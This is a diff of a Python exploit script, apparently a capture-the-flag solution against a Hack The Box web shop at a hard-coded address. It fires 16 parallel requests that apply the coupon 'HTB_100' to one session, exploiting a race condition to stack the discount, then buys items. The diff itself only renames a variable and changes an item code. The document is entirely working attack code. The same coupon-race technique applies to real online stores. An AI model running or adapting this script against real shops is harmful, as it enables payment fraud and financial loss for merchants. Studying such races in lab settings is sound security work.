@@ -6,21 +6,21 @@ from multiprocessing import Process, Pool
 from threading import Thread
 import requests
 
-ip = 'http://134.122.104.91:31894/'
+url = 'http://134.122.104.91:31894'
 
 def race(cookie):
     headers = {
         'Cookie': f'session={cookie}'
     }
     try:
-        req = requests.post(ip+'/api/coupons/apply', data={'coupon_code': 'HTB_100'}, headers=headers)
+        req = requests.post(url+'/api/coupons/apply', data={'coupon_code': 'HTB_100'}, headers=headers)
         print(req.text)
     except Exception:
         pass
 
 
 if __name__ == '__main__':
-    req = requests.post(ip+'/api/purchase', data={'item': 'C8'})
+    req = requests.post(url+'/api/purchase', data={'item': 'A1'})
     cookie = req.cookies['session']
     ps = []
     for x in range(16):
@@ -33,8 +33,8 @@ if __name__ == '__main__':
     for p in ps:
         p.join()
 
-    req = requests.post(ip+'/api/purchase', data={'item': 'B5'}, headers={'Cookie': f'session={cookie}'})
+    req = requests.post(url+'/api/purchase', data={'item': 'B5'}, headers={'Cookie': f'session={cookie}'})
     print(req.text)
 
-    req = requests.post(ip+'/api/purchase', data={'item': 'C8'}, headers={'Cookie': f'session={cookie}'})
+    req = requests.post(url+'/api/purchase', data={'item': 'C8'}, headers={'Cookie': f'session={cookie}'})
     print(req.text)
